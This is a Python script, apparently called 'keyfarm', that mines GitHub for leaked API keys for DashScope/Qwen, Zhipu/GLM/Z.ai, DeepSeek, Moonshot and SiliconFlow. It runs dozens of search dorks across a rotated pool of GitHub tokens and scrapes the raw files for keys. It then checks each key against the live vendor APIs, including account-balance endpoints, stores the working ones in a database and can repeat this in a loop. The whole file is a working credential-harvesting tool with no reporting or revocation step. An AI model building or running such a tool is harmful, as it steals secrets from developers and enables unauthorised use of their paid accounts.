"""TARGETED DASHSCOPE/ZAI/GLM family hunt — one-shot deep sweep.

57 dorks (DASHSCOPE + ZAI/ZHIPU/GLM/BIGMODEL + bailian/qwen/tongyi contexts),
10 pages each (1000 results vs 600 in gh_eternal), raw file fetch + scan,
then IMMEDIATE validation of every find (dashscope chat / zai models /
deepseek balance / moonshot / siliconflow) -> WORKING/DEAD in DB.

found='ds-hunt'. PAT pool from gh_tokens.txt.
"""
import hashlib
import os
import json
import sqlite3
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "keys.db")
LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "dashscope_hunt.log")
TOKENS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gh_tokens.txt")
API = "https://api.github.com/search/code"
N_THREADS = 8
PAGES = 10
RAW_BUDGET = 3000

from key_patterns import scan_text

GARBAGE = ("xxxx", "your", "YOUR", "EXAMPLE", "example", "n0tr3al",
           "placeholder", "CHANGEME", "changeme", "dummy", "DUMMY",
           "abcdefghijklmnopqrst", "1234567890abcdef")

FAMILY = ("DASHSCOPE", "ZAI", "ZHIPU", "GLM", "BIGMODEL", "QWEN",
          "TONGYI", "KIMI", "MOONSHOT", "SILICONFLOW", "DEEPSEEK")

DORKS = [
    # DASHSCOPE core
    "DASHSCOPE_API_KEY filename:.env",
    "DASHSCOPE_API_KEY filename:json",
    "DASHSCOPE_API_KEY filename:config",
    "DASHSCOPE_API_KEY filename:py",
    "DASHSCOPE_API_KEY filename:java",
    "DASHSCOPE_API_KEY filename:js",
    "DASHSCOPE_API_KEY filename:ts",
    "DASHSCOPE_API_KEY filename:md",
    "DASHSCOPE_API_KEY filename:ipynb",
    "DASHSCOPE_API_KEY filename:sh",
    "DASHSCOPE_API_KEY filename:yml",
    "DASHSCOPE_API_KEY filename:yaml",
    "DASHSCOPE_API_KEY filename:properties",
    "DASHSCOPE_API_KEY filename:toml",
    "DASHSCOPE_API_KEY filename:xml",
    "DASHSCOPE_API_KEY filename:sql",
    "DASHSCOPE_API_KEY filename:rb",
    "DASHSCOPE_API_KEY filename:go",
    "DASHSCOPE_API_KEY filename:php",
    "DASHSCOPE_API_KEY filename:gradle",
    "DASHSCOPE_API_KEY filename:docker-compose",
    "DASHSCOPE_API_KEY filename:Makefile",
    "spring.ai.dashscope",
    "dashscope filename:application.yml",
    "dashscope filename:application.properties",
    "dashscope.api-key",
    "bailian filename:.env",
    "qwen_api_key",
    "tongyi filename:.env",
    "QWEN_API_KEY filename:.env",
    "aliyuncs filename:.env sk-",
    "dashscope sk- filename:txt",
    # ZAI / GLM / Zhipu
    "ZAI_API_KEY filename:.env",
    "ZAI_API_KEY filename:json",
    "ZAI_API_KEY filename:py",
    "ZAI_API_KEY filename:config",
    "Z_AI_API_KEY filename:.env",
    "zhipuai filename:.env",
    "ZHIPU_API_KEY filename:.env",
    "ZHIPU_API_KEY filename:json",
    "ZHIPU_API_KEY filename:py",
    "ZHIPU_API_KEY filename:config",
    "ZHIPUAI_API_KEY filename:.env",
    "ZHIPUAI_API_KEY filename:json",
    "BIGMODEL_API_KEY filename:.env",
    "BIGMODEL filename:config",
    "GLM_API_KEY filename:.env",
    "GLM_API_KEY filename:json",
    "GLM_API_KEY filename:config",
    "GLM_API_KEY filename:py",
    "bigmodel.cn filename:.env",
    "api.z.ai filename:.env",
    "z.ai api_key filename:json",
    "GLM_4_API_KEY",
    "glm coding filename:.env",
    "zai filename:application.yml",
    "GLM filename:settings",
]


def log(msg):
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n"
    with open(LOG, "a", encoding="utf-8", errors="replace") as f:
        f.write(line)


class PATPool:
    def __init__(self):
        self.tokens = []
        self.dead = set()
        self._i = 0
        self._lock = threading.Lock()
        try:
            with open(TOKENS_FILE, encoding="utf-8") as f:
                for line in f:
                    t = line.strip()
                    if t.startswith("ghp_") and t not in self.tokens:
                        self.tokens.append(t)
        except Exception:
            pass
        try:
            r = subprocess.run(["gh", "auth", "token"], capture_output=True,
                               text=True, timeout=5)
            t = r.stdout.strip()
            if t and t not in self.tokens:
                self.tokens.append(t)
        except Exception:
            pass

    def next(self):
        with self._lock:
            live = [t for t in self.tokens if t not in self.dead]
            if not live:
                return ""
            t = live[self._i % len(live)]
            self._i += 1
            return t

    def mark_dead(self, t):
        with self._lock:
            self.dead.add(t)


POOL = PATPool()


def rest_search(query, page):
    tok = POOL.next()
    if not tok:
        return None, "no tokens"
    try:
        r = requests.get(
            API,
            params={"q": query, "per_page": 100, "page": page,
                    "sort": "indexed", "order": "desc"},
            headers={"Authorization": f"Bearer {tok}",
                     "Accept": "application/vnd.github.text-match+json",
                     "User-Agent": "keyfarm"},
            timeout=30)
        if r.status_code == 401:
            POOL.mark_dead(tok)
            return None, "401"
        if r.status_code in (403, 429):
            return None, "rate"
        if r.status_code != 200:
            return None, f"HTTP {r.status_code}"
        return r.json().get("items", []), "ok"
    except Exception as e:
        return None, repr(e)


conn = sqlite3.connect(DB, timeout=120, check_same_thread=False,
                       isolation_level=None)
lock = threading.Lock()
dblock = threading.Lock()
seen_files = set()
raw_fetched = [0]
found_keys = {}     # hash -> (val, prov, repo) collected this run


def db_upsert(key, prov, repo):
    h = hashlib.sha1(key.encode()).hexdigest()[:16]
    with dblock:
        conn.execute(
            "INSERT INTO keys (hash, val, prov, status, found, repo) "
            "VALUES (?,?,?,?,?,?) "
            "ON CONFLICT(hash) DO UPDATE SET status='NEW', "
            "found=excluded.found, repo=excluded.repo "
            "WHERE keys.status IN ('DEAD','ERR')",
            (h, key, prov, "NEW", "ds-hunt", repo))
    return h


def work(q):
    n_new = 0
    for page in range(1, PAGES + 1):
        items, st = rest_search(q, page)
        if items is None:
            if st == "rate":
                time.sleep(15)
                items, st = rest_search(q, page)
            if items is None:
                log(f"  {q!r} p{page}: {st}")
                return n_new
        for h in items:
            repo = h.get("repository", {}).get("full_name", "?")
            path = h.get("path", "")
            texts = [json.dumps(h.get("text_matches", []))]
            fp = (repo, path)
            with lock:
                if fp in seen_files:
                    continue
                seen_files.add(fp)
                if raw_fetched[0] < RAW_BUDGET:
                    raw_fetched[0] += 1
                    do_raw = True
                else:
                    do_raw = False
            if do_raw:
                try:
                    raw = requests.get(
                        f"https://raw.githubusercontent.com/{repo}/HEAD/{path}",
                        timeout=20)
                    if raw.status_code == 200 and len(raw.text) < 2_000_000:
                        texts.append(raw.text)
                except Exception:
                    pass
            for text in texts:
                for prov, key in scan_text(text):
                    if isinstance(key, tuple):
                        key = key[0]
                    if not key or key in found_keys \
                       or any(g in key for g in GARBAGE) or len(key) < 30:
                        continue
                    # family filter: keep only the targeted shapes
                    if prov not in FAMILY:
                        continue
                    hsh = db_upsert(key, prov, f"{repo}/{path}")
                    with lock:
                        found_keys[hsh] = (key, prov, f"{repo}/{path}")
                    n_new += 1
        time.sleep(2.5)
    return n_new


# ── immediate validation of this run's finds ─────────────────────────────
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36"}


def probe_dashscope(k):
    try:
        r = requests.post(
            "https://dashscope.aliyuncs.com/compatible-mode/v1/"
            "chat/completions",
            headers={**UA, "Authorization": f"Bearer {k}",
                     "Content-Type": "application/json"},
            json={"model": "qwen-plus", "messages": [{"role": "user",
                                                      "content": "hi"}],
                  "max_tokens": 1},
            timeout=15)
        return ("WORKING", "dashscope qwen — chat OK") if r.status_code == 200 \
            else ("reject", r.status_code)
    except Exception:
        return ("net", None)


def probe_zai(k):
    try:
        r = requests.get("https://api.z.ai/api/paas/v4/models",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200:
            try:
                n = len(r.json().get("data", []))
            except Exception:
                n = 0
            return ("WORKING", f"zai models={n}")
        return ("reject", r.status_code)
    except Exception:
        return ("net", None)


def probe_bigmodel(k):
    try:
        r = requests.get("https://open.bigmodel.cn/api/paas/v4/models",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200:
            return ("WORKING", "zhipu bigmodels OK")
        return ("reject", r.status_code)
    except Exception:
        return ("net", None)


def probe_deepseek(k):
    try:
        r = requests.get("https://api.deepseek.com/user/balance",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200:
            try:
                b = (r.json().get("balance_infos") or [{}])[0]
                return ("WORKING", f"deepseek ${b.get('total_balance', '?')}")
            except Exception:
                return ("WORKING", "deepseek OK")
        return ("reject", r.status_code)
    except Exception:
        return ("net", None)


def probe_moonshot(k):
    try:
        r = requests.get("https://api.moonshot.cn/v1/users/me/balance",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        if r.status_code == 200:
            try:
                b = r.json().get("data", {}).get("balance", "?")
                return ("WORKING", f"moonshot ¥{b}")
            except Exception:
                return ("WORKING", "moonshot OK")
        return ("reject", r.status_code)
    except Exception:
        return ("net", None)


def probe_siliconflow(k):
    try:
        r = requests.get("https://api.siliconflow.cn/v1/models",
                         headers={**UA, "Authorization": f"Bearer {k}"},
                         timeout=15)
        return ("WORKING", "siliconflow models OK") if r.status_code == 200 \
            else ("reject", r.status_code)
    except Exception:
        return ("net", None)


def validate_key(hsh, key, prov, repo):
    """Probe a found key across the family's endpoints; classify."""
    is_zai_shape = "." in key and len(key.split(".")[0]) == 32 \
        and len(key) > 40
    probes = []
    if is_zai_shape:
        probes += [probe_zai, probe_bigmodel]
    else:  # sk- shape: dashscope/deepseek/moonshot/siliconflow share it
        probes += [probe_dashscope, probe_deepseek, probe_moonshot,
                   probe_siliconflow]
    results = [p(key) for p in probes]
    alive = [r for r in results if r[0] == "WORKING"]
    nets = [r for r in results if r[0] == "net"]
    if alive:
        plan = " | ".join(a[1] for a in alive)
        with dblock:
            conn.execute(
                "UPDATE keys SET status='WORKING', plan=?, remaining=? "
                "WHERE hash=?", (plan[:200], "OK", hsh))
        return ("WORKING", plan)
    if results and len(nets) == len(results):
        return ("NEW", "net-fail")     # leave NEW, validator retries later
    with dblock:
        conn.execute("UPDATE keys SET status='DEAD' WHERE hash=?", (hsh,))
    return ("DEAD", None)


def main():
    log(f"=== dashscope hunt START pats={len(POOL.tokens)} "
        f"dorks={len(DORKS)} pages={PAGES} ===")
    with ThreadPoolExecutor(max_workers=N_THREADS) as ex:
        futs = {ex.submit(work, q): q for q in DORKS}
        for fut in as_completed(futs):
            q = futs[fut]
            try:
                n = fut.result()
                if n:
                    log(f"  dork +{n}: {q!r}")
            except Exception as e:
                log(f"  dork error {q!r}: {e!r}")
    log(f"HUNT done: +{len(found_keys)} keys, "
        f"raw_files={raw_fetched[0]} — validating...")

    working = dead = 0
    with ThreadPoolExecutor(max_workers=N_THREADS) as ex:
        futs = {}
        for hsh, (key, prov, repo) in found_keys.items():
            futs[ex.submit(validate_key, hsh, key, prov, repo)] = (hsh, key,
                                                                   prov, repo)
        for fut in as_completed(futs):
            try:
                st, info = fut.result()
            except Exception:
                continue
            if st == "WORKING":
                working += 1
                log(f"  LIVE {key[:12]}... {info}  <- {repo[:70]}")
            elif st == "DEAD":
                dead += 1
    log(f"VALIDATE done: WORKING={working} DEAD={dead} "
        f"(of {len(found_keys)})")


LOOP_SLEEP = 1800


def loop():
    while True:
        try:
            found_keys.clear()
            seen_files.clear()
            raw_fetched[0] = 0
            main()
        except Exception as e:
            log(f"loop error: {e!r}")
        log(f"sleep {LOOP_SLEEP}s before next cycle")
        time.sleep(LOOP_SLEEP)


if __name__ == "__main__":
    import sys
    if "--loop" in sys.argv:
        loop()
    else:
        main()
